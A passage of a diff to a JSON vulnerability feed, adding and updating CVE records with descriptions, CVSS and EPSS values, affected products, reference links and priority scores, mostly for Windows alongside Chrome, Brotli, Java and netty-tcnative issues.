+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "windows"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 48.1,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 13.0,
+        "unauth_network": 5,
+        "epss": 0.1
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-69973",
+      "aliases": [],
+      "title": "",
+      "description": "Improper limitation of a pathname to a restricted directory ('path traversal') in Windows Libarchive allows an unauthorized attacker to perform tampering over a network.",
+      "published": "2026-10-13T19:19:07.930",
+      "updated": "2026-10-26T17:56:08.120",
+      "cvss": 6.5,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N",
+      "severity": "medium",
+      "cpes": [
+        "microsoft:windows_10_1809",
+        "microsoft:windows_10_21h2",
+        "microsoft:windows_10_22h2",
+        "microsoft:windows_11_23h2",
+        "microsoft:windows_11_24h2",
+        "microsoft:windows_11_25h2",
+        "microsoft:windows_11_26h1",
+        "microsoft:windows_11_26h2",
+        "microsoft:windows_server_2019",
+        "microsoft:windows_server_2022",
+        "microsoft:windows_server_2025"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-69973"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00802,
+      "epss_percentile": 0.56375,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "windows"
       ],
       "match_type": "exact",
       "tier": 1,
@@ -2424,12 +3309,60 @@
       "ai_analysis": ""
     },
     {
+      "id": "CVE-2026-113082",
+      "aliases": [],
+      "title": "",
+      "description": "Memory corruption in ANGLE in Google Chrome on on Windows prior to 156.0.8078.47 allowed a remote attacker to potentially read memory inside the sandbox via a crafted HTML page. (Chromium security severity: High)",
+      "published": "2026-10-20T22:18:59.823",
+      "updated": "2026-10-26T18:38:02.337",
+      "cvss": 6.5,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N",
+      "severity": "medium",
+      "cpes": [
+        "google:chrome"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://chromereleases.googleblog.com/2026/10/stable-channel-update-for-desktop_02018666648.html",
+        "https://issues.chromium.org/issues/556505644"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00292,
+      "epss_percentile": 0.21532,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "chrome"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 48.0,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 13.0,
+        "unauth_network": 5,
+        "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
       "id": "CVE-2026-111497",
       "aliases": [],
       "title": "",
       "description": "A buffer overflow vulnerability in the Brotli decoder (c/dec/decode.c) in Google Brotli versions 1.0.3 through 1.2.0 on all platforms allows a remote unauthenticated attacker to corrupt adjacent decoder state memory, disclose sensitive memory contents, cause a denial of service, or potentially execute arbitrary code using a crafted Brotli-compressed stream.\n\n\n\n\n\nUsers need to update any Brotli libraries or binaries between 1.0.3 through 1.2.0 to the latest available version: 1.0.10 or 1.1.1 or 1.2.1.",
       "published": "2026-10-22T14:17:37.190",
-      "updated": "2026-10-26T14:16:28.143",
+      "updated": "2026-10-26T18:17:36.103",
       "cvss": 9.2,
       "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
       "severity": "critical",
@@ -2442,11 +3375,11 @@
         "http://www.openwall.com/lists/oss-security/2026/10/24/6",
         "http://www.openwall.com/lists/oss-security/2026/10/26/12",
         "http://www.openwall.com/lists/oss-security/2026/10/26/13",
+        "http://www.openwall.com/lists/oss-security/2026/10/26/16",
         "https://broccoli2shell.com",
         "https://github.com/advisories/GHSA-9v8h-qqgm-4m35",
         "https://github.com/dotnet/announcements/issues/494",
-        "https://github.com/google/brotli/releases/tag/v1.0.10",
-        "https://github.com/google/brotli/releases/tag/v1.1.1"
+        "https://github.com/google/brotli/releases/tag/v1.0.10"
       ],
       "exploit_ref": false,
       "kev": false,
@@ -2585,6 +3518,59 @@
       "score_breakdown": {
         "popularity": 30,
         "cvss": 17.6,
+        "epss": 0.1
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-69982",
+      "aliases": [],
+      "title": "",
+      "description": "Weak authentication in Active Directory Federation Services (AD FS) allows an unauthorized attacker to bypass a security feature over a network.",
+      "published": "2026-10-13T19:19:08.890",
+      "updated": "2026-10-26T17:27:03.750",
+      "cvss": 5.9,
+      "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:H/A:N",
+      "severity": "medium",
+      "cpes": [
+        "microsoft:windows_10_1607",
+        "microsoft:windows_10_1809",
+        "microsoft:windows_server_2012",
+        "microsoft:windows_server_2016",
+        "microsoft:windows_server_2019",
+        "microsoft:windows_server_2022",
+        "microsoft:windows_server_2025"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-69982"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00663,
+      "epss_percentile": 0.51436,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "windows"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 46.9,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 11.8,
+        "unauth_network": 5,
         "epss": 0.1
       },
       "ai_analysis": ""
@@ -3325,6 +4311,176 @@
       "ai_analysis": ""
     },
     {
+      "id": "CVE-2026-103553",
+      "aliases": [],
+      "title": "",
+      "description": "Out-of-bounds read in Windows Partition Management Driver allows an authorized attacker to elevate privileges locally.",
+      "published": "2026-10-13T19:17:51.737",
+      "updated": "2026-10-26T16:32:07.973",
+      "cvss": 7.8,
+      "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+      "severity": "high",
+      "cpes": [
+        "microsoft:windows_10_1607",
+        "microsoft:windows_10_1809",
+        "microsoft:windows_10_21h2",
+        "microsoft:windows_10_22h2",
+        "microsoft:windows_11_23h2",
+        "microsoft:windows_11_24h2",
+        "microsoft:windows_11_25h2",
+        "microsoft:windows_11_26h1",
+        "microsoft:windows_11_26h2",
+        "microsoft:windows_server_2012",
+        "microsoft:windows_server_2016",
+        "microsoft:windows_server_2019",
+        "microsoft:windows_server_2022",
+        "microsoft:windows_server_2025"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-103553"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00361,
+      "epss_percentile": 0.29701,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "windows"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 45.7,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 15.6,
+        "epss": 0.1
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-61931",
+      "aliases": [],
+      "title": "",
+      "description": "Use after free in Windows Perception Simulation Service allows an authorized attacker to elevate privileges locally.",
+      "published": "2026-10-13T19:18:53.153",
+      "updated": "2026-10-26T16:46:22.947",
+      "cvss": 7.8,
+      "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+      "severity": "high",
+      "cpes": [
+        "microsoft:windows_10_1809",
+        "microsoft:windows_10_21h2",
+        "microsoft:windows_10_22h2",
+        "microsoft:windows_11_23h2",
+        "microsoft:windows_11_24h2",
+        "microsoft:windows_11_25h2",
+        "microsoft:windows_11_26h2",
+        "microsoft:windows_server_2019"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-61931"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00388,
+      "epss_percentile": 0.32635,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "windows"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 45.7,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 15.6,
+        "epss": 0.1
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-69633",
+      "aliases": [],
+      "title": "",
+      "description": "Heap-based buffer overflow in Windows Update allows an authorized attacker to elevate privileges locally.",
+      "published": "2026-10-13T19:18:56.173",
+      "updated": "2026-10-26T16:38:22.270",
+      "cvss": 7.8,
+      "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+      "severity": "high",
+      "cpes": [
+        "microsoft:windows_10_1607",
+        "microsoft:windows_10_1809",
+        "microsoft:windows_10_21h2",
+        "microsoft:windows_10_22h2",
+        "microsoft:windows_11_23h2",
+        "microsoft:windows_11_24h2",
+        "microsoft:windows_11_25h2",
+        "microsoft:windows_11_26h1",
+        "microsoft:windows_11_26h2",
+        "microsoft:windows_server_2016",
+        "microsoft:windows_server_2019",
+        "microsoft:windows_server_2022",
+        "microsoft:windows_server_2025"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-69633"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00388,
+      "epss_percentile": 0.32637,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "windows"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 45.7,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 15.6,
+        "epss": 0.1
+      },
+      "ai_analysis": ""
+    },
+    {
       "id": "CVE-2026-98093",
       "aliases": [],
       "title": "",
@@ -3843,6 +4999,65 @@
       "ai_analysis": ""
     },
     {
+      "id": "CVE-2026-96867",
+      "aliases": [],
+      "title": "",
+      "description": "Out-of-bounds read in Windows NTFS allows an authorized attacker to execute code locally.",
+      "published": "2026-10-13T19:22:01.200",
+      "updated": "2026-10-26T15:37:41.573",
+      "cvss": 7.8,
+      "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+      "severity": "high",
+      "cpes": [
+        "microsoft:windows_10_1607",
+        "microsoft:windows_10_1809",
+        "microsoft:windows_10_21h2",
+        "microsoft:windows_10_22h2",
+        "microsoft:windows_11_23h2",
+        "microsoft:windows_11_24h2",
+        "microsoft:windows_11_25h2",
+        "microsoft:windows_11_26h1",
+        "microsoft:windows_11_26h2",
+        "microsoft:windows_server_2012",
+        "microsoft:windows_server_2016",
+        "microsoft:windows_server_2019",
+        "microsoft:windows_server_2022",
+        "microsoft:windows_server_2025"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-96867"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00318,
+      "epss_percentile": 0.24543,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "windows"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 45.6,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 15.6,
+        "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
       "id": "CVE-2026-105009",
       "aliases": [],
       "title": "",
@@ -4056,7 +5271,7 @@
       "title": "",
       "description": "Vulnerability in the Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition product of Oracle Java SE (component: JSSE).  Supported versions that are affected are Oracle Java SE: 8u511-b32, 8u511-perf-b32, 11.0.33.0.2, 17.0.21.0.2, 21.0.13.0.2, 25.0.5.0.2, 27.0.1.0.2; Oracle GraalVM for JDK: 17.0.21.0.2 and  21.0.13.0.2; Oracle GraalVM Enterprise Edition: 21.3.20.0.2. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition.  Successful attacks of this vulnerability can result in  unauthorized creation, deletion or modification access to critical data or all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data as well as  unauthorized access to critical data or complete access to all Oracle Java SE, Oracle GraalVM for JDK, Oracle GraalVM Enterprise Edition accessible data. Note: This vulnerability can be exploited by using APIs in the specified Component, e.g., through a web service which supplies data to the APIs. This vulnerability also applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. CVSS 3.1 Base Score 9.1 (Confidentiality and Integrity impacts).  CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N).",
       "published": "2026-10-24T19:17:04.413",
-      "updated": "2026-10-25T04:17:07.843",
+      "updated": "2026-10-26T16:58:40.880",
       "cvss": 9.1,
       "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
       "severity": "critical",
@@ -4071,8 +5286,8 @@
       "kev_date_added": "",
       "ransomware": false,
       "ssvc_exploitation": "",
-      "epss": null,
-      "epss_percentile": null,
+      "epss": 0.00253,
+      "epss_percentile": 0.16653,
       "x_mentions": null,
       "sources": [
         "nvd"
@@ -4090,7 +5305,8 @@
       "score_breakdown": {
         "popularity": 21.0,
         "cvss": 18.2,
-        "unauth_network": 5
+        "unauth_network": 5,
+        "epss": 0.0
       },
       "ai_analysis": ""
     },
@@ -4509,6 +5725,343 @@
       "category": "vuln",
       "resolved_at": "",
       "first_seen": "2026-10-26T15:33:11.752934+00:00",
+      "matched": [
+        "windows"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 44.0,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 14.0,
+        "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-103554",
+      "aliases": [],
+      "title": "",
+      "description": "Use after free in Windows Broadcast DVR User Service allows an authorized attacker to elevate privileges locally.",
+      "published": "2026-10-13T19:17:51.903",
+      "updated": "2026-10-26T16:31:52.127",
+      "cvss": 7.0,
+      "cvss_vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
+      "severity": "high",
+      "cpes": [
+        "microsoft:windows_10_1809",
+        "microsoft:windows_10_21h2",
+        "microsoft:windows_10_22h2",
+        "microsoft:windows_11_23h2",
+        "microsoft:windows_11_24h2",
+        "microsoft:windows_11_25h2",
+        "microsoft:windows_11_26h1",
+        "microsoft:windows_11_26h2",
+        "microsoft:windows_server_2019"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-103554"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00286,
+      "epss_percentile": 0.20938,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "windows"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 44.0,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 14.0,
+        "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-103565",
+      "aliases": [],
+      "title": "",
+      "description": "Use after free in Windows Broadcast DVR User Service allows an authorized attacker to elevate privileges locally.",
+      "published": "2026-10-13T19:17:52.523",
+      "updated": "2026-10-26T16:31:07.307",
+      "cvss": 7.0,
+      "cvss_vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
+      "severity": "high",
+      "cpes": [
+        "microsoft:windows_10_1809",
+        "microsoft:windows_10_21h2",
+        "microsoft:windows_10_22h2",
+        "microsoft:windows_11_23h2",
+        "microsoft:windows_11_24h2",
+        "microsoft:windows_11_25h2",
+        "microsoft:windows_11_26h1",
+        "microsoft:windows_11_26h2",
+        "microsoft:windows_server_2019"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-103565"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00286,
+      "epss_percentile": 0.20935,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "windows"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 44.0,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 14.0,
+        "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-105722",
+      "aliases": [],
+      "title": "",
+      "description": "Use after free in Windows Broadcast DVR User Service allows an authorized attacker to elevate privileges locally.",
+      "published": "2026-10-13T19:18:00.150",
+      "updated": "2026-10-26T17:20:56.967",
+      "cvss": 7.0,
+      "cvss_vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
+      "severity": "high",
+      "cpes": [
+        "microsoft:windows_10_1809",
+        "microsoft:windows_10_21h2",
+        "microsoft:windows_10_22h2",
+        "microsoft:windows_11_23h2",
+        "microsoft:windows_11_24h2",
+        "microsoft:windows_11_25h2",
+        "microsoft:windows_11_26h1",
+        "microsoft:windows_11_26h2",
+        "microsoft:windows_server_2019"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-105722"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00286,
+      "epss_percentile": 0.20937,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "windows"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 44.0,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 14.0,
+        "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-69596",
+      "aliases": [],
+      "title": "",
+      "description": "Use after free in Windows Program Compatibility Assistant Service allows an authorized attacker to elevate privileges locally.",
+      "published": "2026-10-13T19:18:56.003",
+      "updated": "2026-10-26T16:38:50.687",
+      "cvss": 7.0,
+      "cvss_vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
+      "severity": "high",
+      "cpes": [
+        "microsoft:windows_10_1607",
+        "microsoft:windows_10_1809",
+        "microsoft:windows_10_21h2",
+        "microsoft:windows_10_22h2",
+        "microsoft:windows_11_23h2",
+        "microsoft:windows_11_24h2",
+        "microsoft:windows_11_25h2",
+        "microsoft:windows_11_26h1",
+        "microsoft:windows_11_26h2",
+        "microsoft:windows_server_2016",
+        "microsoft:windows_server_2019",
+        "microsoft:windows_server_2022",
+        "microsoft:windows_server_2025"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-69596"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00307,
+      "epss_percentile": 0.23277,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "windows"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 44.0,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 14.0,
+        "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-69970",
+      "aliases": [],
+      "title": "",
+      "description": "Heap-based buffer overflow in Microsoft Streaming Service allows an authorized attacker to elevate privileges locally.",
+      "published": "2026-10-13T19:19:07.653",
+      "updated": "2026-10-26T17:57:56.813",
+      "cvss": 7.0,
+      "cvss_vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
+      "severity": "high",
+      "cpes": [
+        "microsoft:windows_10_1607",
+        "microsoft:windows_10_1809",
+        "microsoft:windows_10_21h2",
+        "microsoft:windows_10_22h2",
+        "microsoft:windows_11_23h2",
+        "microsoft:windows_11_24h2",
+        "microsoft:windows_11_25h2",
+        "microsoft:windows_11_26h1",
+        "microsoft:windows_11_26h2",
+        "microsoft:windows_server_2016",
+        "microsoft:windows_server_2019",
+        "microsoft:windows_server_2022",
+        "microsoft:windows_server_2025"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-69970"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00275,
+      "epss_percentile": 0.19743,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "windows"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 44.0,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 14.0,
+        "epss": 0.0
+      },
+      "ai_analysis": ""
+    },
+    {
+      "id": "CVE-2026-69977",
+      "aliases": [],
+      "title": "",
+      "description": "Use after free in Quality Windows Audio/Video Experience (QWAVE) service allows an authorized attacker to elevate privileges locally.",
+      "published": "2026-10-13T19:19:08.420",
+      "updated": "2026-10-26T17:31:35.270",
+      "cvss": 7.0,
+      "cvss_vector": "CVSS:3.1/AV:L/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:H",
+      "severity": "high",
+      "cpes": [
+        "microsoft:windows_10_1607",
+        "microsoft:windows_10_1809",
+        "microsoft:windows_10_21h2",
+        "microsoft:windows_10_22h2",
+        "microsoft:windows_11_23h2",
+        "microsoft:windows_11_24h2",
+        "microsoft:windows_11_25h2",
+        "microsoft:windows_11_26h1",
+        "microsoft:windows_11_26h2",
+        "microsoft:windows_server_2012",
+        "microsoft:windows_server_2016",
+        "microsoft:windows_server_2019",
+        "microsoft:windows_server_2022",
+        "microsoft:windows_server_2025"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-69977"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00307,
+      "epss_percentile": 0.23281,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
       "matched": [
         "windows"
       ],
@@ -5022,6 +6575,65 @@
       "ai_analysis": ""
     },
     {
+      "id": "CVE-2026-69635",
+      "aliases": [],
+      "title": "",
+      "description": "Heap-based buffer overflow in Windows Installer allows an authorized attacker to elevate privileges with a physical attack.",
+      "published": "2026-10-13T19:18:56.527",
+      "updated": "2026-10-26T16:33:57.410",
+      "cvss": 6.6,
+      "cvss_vector": "CVSS:3.1/AV:P/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H",
+      "severity": "medium",
+      "cpes": [
+        "microsoft:windows_10_1607",
+        "microsoft:windows_10_1809",
+        "microsoft:windows_10_21h2",
+        "microsoft:windows_10_22h2",
+        "microsoft:windows_11_23h2",
+        "microsoft:windows_11_24h2",
+        "microsoft:windows_11_25h2",
+        "microsoft:windows_11_26h1",
+        "microsoft:windows_11_26h2",
+        "microsoft:windows_server_2012",
+        "microsoft:windows_server_2016",
+        "microsoft:windows_server_2019",
+        "microsoft:windows_server_2022",
+        "microsoft:windows_server_2025"
+      ],
+      "packages": [],
+      "vendor_products": [],
+      "references": [
+        "https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-69635"
+      ],
+      "exploit_ref": false,
+      "kev": false,
+      "kev_date_added": "",
+      "ransomware": false,
+      "ssvc_exploitation": "",
+      "epss": 0.00466,
+      "epss_percentile": 0.40119,
+      "x_mentions": null,
+      "sources": [
+        "nvd"
+      ],
+      "category": "vuln",
+      "resolved_at": "",
+      "first_seen": "2026-10-26T19:59:36.444930+00:00",
+      "matched": [
+        "windows"
+      ],
+      "match_type": "exact",
+      "tier": 1,
+      "score": 43.3,
+      "level": "medium",
+      "score_breakdown": {
+        "popularity": 30,
+        "cvss": 13.2,
+        "epss": 0.1
+      },
+      "ai_analysis": ""
+    },
+    {
       "id": "CVE-2026-115955",
       "aliases": [],
       "title": "WordPress Advanced Post Block - Post Grid for WordPress block editor plugin <= 2.5.1 - Cross Site Scripting (XSS) vulnerability",
@@ -5173,25 +6785,22 @@
     {
       "id": "CVE-2026-116540",
       "aliases": [],
-      "title": "netty-tcnative 2.0.66.Final before 2.0.84.Final Use-After-Free in Session Ticket Callback",
+      "title": "",
       "description": "netty-tcnative 2.0.66.Final before 2.0.84.Final built against OpenSSL 3.x contains a use-after-free vulnerability in ssl_tlsext_ticket_key_cb during session ticket key rotation. Remote clients performing TLS handshakes while setSessionTicketKeys0 frees the shared key array cause OpenSSL to read freed HMAC keys, crashing or corrupting ticket processing.",
-      "published": "2026-10-26T14:59:40.154Z",
-      "updated": "2026-10-26T14:59:40.154Z",
+      "published": "2026-10-26T16:17:19.377",
+      "updated": "2026-10-26T17:17:27.187",
       "cvss": 8.2,
-      "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N",
+      "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X",
       "severity": "high",
       "cpes": [],
       "packages": [],
-      "vendor_products": [
-        "netty netty-tcnative",
-        "io.netty:netty-tcnative"
-      ],
+      "vendor_products": [],
       "references": [
-        "https://github.com/netty/netty-tcnative/security/advisories/GHSA-mmc8-vg2v-fvvw",
-        "https://github.com/netty/netty-tcnative/commit/59662a8b07a9a7623ae1bc472f5751f31c81a118",
-        "https://github.com/netty/netty-tcnative/blob/netty-tcnative-parent-2.0.83.Final/openssl-dynamic/src/main/c/sslcontext.c#L1365",
-        "https://github.com/netty/netty-tcnative/releases/tag/netty-tcnative-parent-2.0.84.Final",
         "https://github.com/netty/netty-tcnative",
+        "https://github.com/netty/netty-tcnative/blob/netty-tcnative-parent-2.0.83.Final/openssl-dynamic/src/main/c/sslcontext.c#L1365",
+        "https://github.com/netty/netty-tcnative/commit/59662a8b07a9a7623ae1bc472f5751f31c81a118",
+        "https://github.com/netty/netty-tcnative/releases/tag/netty-tcnative-parent-2.0.84.Final",
+        "https://github.com/netty/netty-tcnative/security/advisories/GHSA-mmc8-vg2v-fvvw",
         "https://www.vulncheck.com/advisories/netty-tcnative-2.0.66-final-before-2.0.84-final-use-after-free-in-session-ticket-callback"
       ],
       "exploit_ref": false,
@@ -5203,7 +6812,7 @@
       "epss_percentile": null,
       "x_mentions": null,
